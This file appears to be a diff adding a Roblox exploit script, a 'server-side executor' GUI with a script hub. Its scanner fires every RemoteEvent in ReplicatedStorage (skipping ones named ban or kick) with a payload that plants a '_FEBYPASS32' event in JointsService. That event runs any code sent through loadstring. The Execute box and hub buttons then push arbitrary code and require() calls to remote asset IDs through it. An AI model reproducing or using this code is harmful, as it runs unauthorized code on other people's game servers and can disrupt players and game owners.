@@ -1,0 +1,274 @@
+aaa = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextBox = Instance.new("TextBox")
+local TextLabel = Instance.new("TextLabel")
+local TextButton = Instance.new("TextButton")
+local unfe = Instance.new("TextButton")
+local exec = Instance.new("TextButton")
+local clear = Instance.new("TextButton")
+local scripthub = Instance.new("Frame")
+local grabknife = Instance.new("TextButton")
+local TextLabel_2 = Instance.new("TextLabel")
+local ligma = Instance.new("TextButton")
+local freddyfazbear = Instance.new("TextButton")
+local tophat = Instance.new("TextButton")
+local minosprime = Instance.new("TextButton")
+local spongebob = Instance.new("TextButton")
+aaa.Name = "aaa"
+if not getgenv then
+	getgenv = function()
+		return {usecoregui = false}
+	end
+end
+if getgenv().usecoregui == true then
+	aaa.Parent = game.CoreGui
+else
+	aaa.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+end
+aaa.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+aaa.ResetOnSpawn = false
+Frame.Parent = aaa
+Frame.Active = true
+Frame.BackgroundColor3 = Color3.fromRGB(0, 98, 255)
+Frame.Draggable = true
+Frame.Position = UDim2.new(0, 50, 0, 41)
+Frame.Size = UDim2.new(0, 455, 0, 218)
+TextBox.Parent = Frame
+TextBox.BackgroundColor3 = Color3.fromRGB(250, 0, 246)
+TextBox.Position = UDim2.new(0, 0, 0.252293587, 0)
+TextBox.Size = UDim2.new(0, 455, 0, 117)
+TextBox.ClearTextOnFocus = false
+TextBox.Font = Enum.Font.LuckiestGuy
+TextBox.MultiLine = true
+TextBox.PlaceholderText = ""
+TextBox.Text = "i know ur name 🤫"..game.Players.LocalPlayer.Name..""
+TextBox.TextColor3 = Color3.fromRGB(0, 31, 140)
+TextBox.TextSize = 17.000
+TextBox.TextStrokeTransparency = 0.000
+TextBox.TextWrapped = true
+TextBox.TextXAlignment = Enum.TextXAlignment.Left
+TextBox.TextYAlignment = Enum.TextYAlignment.Top
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(250, 0, 246)
+TextLabel.Size = UDim2.new(0, 455, 0, 51)
+TextLabel.Font = Enum.Font.LuckiestGuy
+TextLabel.Text = "gojohdkaisenkt Sever Side"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 23.000
+TextLabel.TextWrapped = true
+TextLabel.TextXAlignment = Enum.TextXAlignment.Left
+TextButton.Parent = TextLabel
+TextButton.BackgroundColor3 = Color3.fromRGB(250, 0, 246)
+TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.BorderSizePixel = 0
+TextButton.Position = UDim2.new(0, 336, 0, 0)
+TextButton.Size = UDim2.new(0, 119, 0, 50)
+TextButton.Font = Enum.Font.LuckiestGuy
+TextButton.Text = "</>"
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextSize = 25.000
+unfe.Name = "unfe"
+unfe.Parent = Frame
+unfe.BackgroundColor3 = Color3.fromRGB(250, 0, 246)
+unfe.Position = UDim2.new(0, 161, 0, 172)
+unfe.Size = UDim2.new(0, 175, 0, 46)
+unfe.Font = Enum.Font.LuckiestGuy
+unfe.Text = "Execute"
+unfe.TextColor3 = Color3.fromRGB(0, 0, 0)
+unfe.TextSize = 32.000
+unfe.TextWrapped = true
+exec.Name = "exec"
+exec.Parent = Frame
+exec.BackgroundColor3 = Color3.fromRGB(250, 0, 246)
+exec.Position = UDim2.new(0, 0, 0, 172)
+exec.Size = UDim2.new(0, 161, 0, 46)
+exec.Font = Enum.Font.LuckiestGuy
+exec.Text = "scanner"
+exec.TextColor3 = Color3.fromRGB(0, 0, 0)
+exec.TextSize = 32.000
+exec.TextWrapped = true
+clear.Name = "clear"
+clear.Parent = Frame
+clear.BackgroundColor3 = Color3.fromRGB(250, 0, 246)
+clear.Position = UDim2.new(0, 337, 0, 172)
+clear.Size = UDim2.new(0, 118, 0, 46)
+clear.Font = Enum.Font.LuckiestGuy
+clear.Text = "Clear"
+clear.TextColor3 = Color3.fromRGB(0, 0, 0)
+clear.TextSize = 32.000
+clear.TextWrapped = true
+scripthub.Name = "scripthub"
+scripthub.Parent = aaa
+scripthub.Active = true
+scripthub.BackgroundColor3 = Color3.fromRGB(1, 0, 0)
+scripthub.Draggable = true
+scripthub.Position = UDim2.new(0, 50, 0, 41)
+scripthub.Size = UDim2.new(0, 455, 0, 218)
+scripthub.Visible = false
+grabknife.Name = "grabknife"
+grabknife.Parent = scripthub
+grabknife.BackgroundColor3 = Color3.fromRGB(110, 173, 255)
+grabknife.Position = UDim2.new(0, 7, 0, 61)
+grabknife.Size = UDim2.new(0, 182, 0, 45)
+grabknife.Font = Enum.Font.LuckiestGuy
+grabknife.Text = "k00pz gui"
+grabknife.TextColor3 = Color3.fromRGB(0, 0, 0)
+grabknife.TextSize = 29.000
+grabknife.TextWrapped = true
+TextLabel_2.Parent = scripthub
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(250, 0, 246)
+TextLabel_2.Size = UDim2.new(0, 455, 0, 51)
+TextLabel_2.Font = Enum.Font.LuckiestGuy
+TextLabel_2.Text = "gojohdkaisenkt hub"
+TextLabel_2.TextColor3 = Color3.fromRGB(245, 245, 245)
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 23.000
+TextLabel_2.TextWrapped = true
+TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left
+ligma.Name = "ligma"
+ligma.Parent = scripthub
+ligma.BackgroundColor3 = Color3.fromRGB(210, 273, 245)
+ligma.Position = UDim2.new(0, 267, 0, 61)
+ligma.Size = UDim2.new(0, 182, 0, 45)
+ligma.Font = Enum.Font.LuckiestGuy
+ligma.Text = "anti skids v14.1.1"
+ligma.TextColor3 = Color3.fromRGB(0, 0, 0)
+ligma.TextSize = 29.000
+ligma.TextWrapped = true
+freddyfazbear.Name = "freddyfazbear"
+freddyfazbear.Parent = scripthub
+freddyfazbear.BackgroundColor3 = Color3.fromRGB(244, 245, 245)
+freddyfazbear.Position = UDim2.new(0, 7, 0, 113)
+freddyfazbear.Size = UDim2.new(0, 182, 0, 45)
+freddyfazbear.Font = Enum.Font.LuckiestGuy
+freddyfazbear.Text = "admin"
+freddyfazbear.TextColor3 = Color3.fromRGB(0, 0, 0)
+freddyfazbear.TextSize = 29.000
+freddyfazbear.TextWrapped = true
+tophat.Name = "tophat"
+tophat.Parent = scripthub
+tophat.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
+tophat.Position = UDim2.new(0, 267, 0, 113)
+tophat.Size = UDim2.new(0, 182, 0, 45)
+tophat.Font = Enum.Font.LuckiestGuy
+tophat.Text = "close"
+tophat.TextColor3 = Color3.fromRGB(0, 0, 0)
+tophat.TextSize = 30.000
+tophat.TextWrapped = true
+minosprime.Name = "minosprime"
+minosprime.Parent = scripthub
+minosprime.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
+minosprime.Position = UDim2.new(0, 7, 0, 167)
+minosprime.Size = UDim2.new(0, 182, 0, 45)
+minosprime.Font = Enum.Font.LuckiestGuy
+minosprime.Text = "POLARIA HUB"
+minosprime.TextColor3 = Color3.fromRGB(0, 0, 0)
+minosprime.TextSize = 32.000
+minosprime.TextWrapped = true
+spongebob.Name = "spongebob"
+spongebob.Parent = scripthub
+spongebob.BackgroundColor3 = Color3.fromRGB(245, 245, 245)
+spongebob.Position = UDim2.new(0, 267, 0, 167)
+spongebob.Size = UDim2.new(0, 182, 0, 45)
+spongebob.Font = Enum.Font.LuckiestGuy
+spongebob.Text = "penis"
+spongebob.TextColor3 = Color3.fromRGB(0, 0, 0)
+spongebob.TextSize = 28.000
+spongebob.TextWrapped = true
+--local backdoor;
+function execute(s)
+	if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+		local Execute=game:GetService("JointsService"):FindFirstChild("_FEBYPASS32"):FireServer(tostring(s)) -- execute
+	else
+		warn("Failed to loadstring: Error 404")
+	end
+end
+grabknife.MouseButton1Click:Connect(function()
+	execute("require(14829670677).EDITL0L('"..game.Players.LocalPlayer.Name.."')")
+end)
+ligma.MouseButton1Click:Connect(function()
+	execute("require(10304477576).AntiSkid('"..game.Players.LocalPlayer.Name.."')")
+end)
+freddyfazbear.MouseButton1Click:Connect(function()
+	execute("require(7192763922).load('"..game.Players.LocalPlayer.Name.."')")
+end)
+minosprime.MouseButton1Click:Connect(function()
+	execute("require(123255432303221):Pload('"..game.Players.LocalPlayer.Name.."')")
+end)
+spongebob.MouseButton1Click:Connect(function()
+	execute("require(140321069022189).pingas('"..game.Players.LocalPlayer.Name.."')")
+end)
+TextButton.MouseButton1Click:Connect(function()
+	if scripthub.Position ~= Frame.Position then
+		scripthub.Visible = not scripthub.Visible
+	end
+end)
+tophat.MouseButton1Down:Connect(function()
+	scripthub.Visible = false
+end)
+exec.MouseButton1Click:Connect(function()
+	exec.Text = "scanning."
+wait(0.01)
+exec.Text = "scanning.."
+wait(0.01)
+exec.Text = "scanning..."
+wait(0.01)
+exec.Text = "not found🔴:("
+wait (0.0000001)
+ local function b_G_V12(see)
+		local a = function(ree)
+			ree:FireServer([[
+                    local folder = Instance.new('RemoteEvent')
+                    folder.Name = "_FEBYPASS32"
+                    folder.Parent = game:GetService("JointsService")
+                    local loadstring = require(13684410229)
+                    folder.OnServerEvent:Connect(function(_1,_2)
+                       loadstring(_2)()
+                    end)
+                    ]]
+			)
+		end
+		for i, v in pairs(see:GetChildren()) do
+			--[[3 lines]]
+			if v:IsA("RemoteEvent") then
+				if not string.match(string.lower(v.Name), "ban") then
+					if not string.match(string.lower(v.Name), "kick") then
+						a(v)
+					end
+				end
+			end
+			--[[-3 lines]]
+			b_G_V12(v) --[[test]]
+		end
+	end
+	local Inject = b_G_V12(game:GetService("ReplicatedStorage"))
+	local timetoken = 0
+	local maxtime = 5
+	repeat wait(0.1) timetoken += 0.1 until game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") or timetoken >= maxtime
+	if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+		exec.Text = "found ✔️🔵:)"
+      wait(3)
+local message = Instance.new("Hint")
+message.Parent = game.Workspace
+message.Text = "script created by gojohdkaisenkt|free+fast in script blox"
+
+task.wait(30)
+ 
+message:Destroy()
+
+exec.Text = "Try scanner"
+	end
+end)
+clear.MouseButton1Click:Connect(function()
+	TextBox.Text = "Clear Success"
+wait(0.5)
+    TextBox.Text = ""
+end)
+unfe.MouseButton1Click:Connect(function()
+	if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+		local Execute=game:GetService("JointsService"):FindFirstChild("_FEBYPASS32"):FireServer(TextBox.Text) -- execute
+	else
+		warn("Failed to loadstring: Error 404")
+	end
+end)
